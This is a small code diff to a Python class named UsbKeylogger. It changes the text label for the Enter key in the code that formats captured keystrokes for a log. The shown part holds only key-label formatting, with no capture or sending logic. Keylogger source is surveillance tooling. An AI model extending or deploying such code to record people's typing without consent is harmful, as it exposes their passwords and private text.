@@ -32,7 +32,7 @@ class UsbKeylogger:
             if eventName == "tab":
                 eventName = "[TAB]\t" # Replaces [TAB] with [TAB] and a tab space afterward    
             elif eventName == "enter":
-                eventName = "[Enter]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
+                eventName = "[ENTER]\n" # Replaces [ENTER] with [ENTER] and a creates a new line afterward              
             elif eventName == "space":
                 eventName = " " # Replaces [SPACE] with " " for readability
             elif eventName == "decimal":
